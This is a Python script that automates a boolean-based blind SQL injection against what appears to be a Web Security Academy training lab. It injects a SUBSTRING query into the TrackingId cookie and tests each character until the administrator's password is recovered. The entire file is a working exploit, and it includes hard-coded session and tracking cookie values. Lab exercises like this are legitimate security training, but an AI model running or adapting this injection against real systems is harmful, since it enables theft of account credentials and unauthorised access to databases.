#!/usr/bin/python3

import requests
import string

url = 'https://0a6200e803e9b651823d98b8009d00cd.web-security-academy.net/'

textSpace = string.ascii_lowercase+string.digits

password = ""

print("-"*30)
print("BruteForcing Started: ")

for i in range(1, 21):
    for t in textSpace:
        headers = {
            'Cookie': f"TrackingId=XpZoPATCdembnIqV' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{t}; session=yQzyBsE7ap7rL1NRAYz5uoIQkLNupKp3",
            'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="104"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Linux"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'close'
        }
        print(t)
        response = requests.get(url, headers=headers)
        
        # Check if the request was successful (status code 200) and "Welcome back in response"
        response_text = response.text
        if response.status_code == 200 and "Welcome back" in response_text:
            password += t
            print("Current found password: ", password)
        
print("-"*30)
print("DONE !!!")
print("Password: ", password)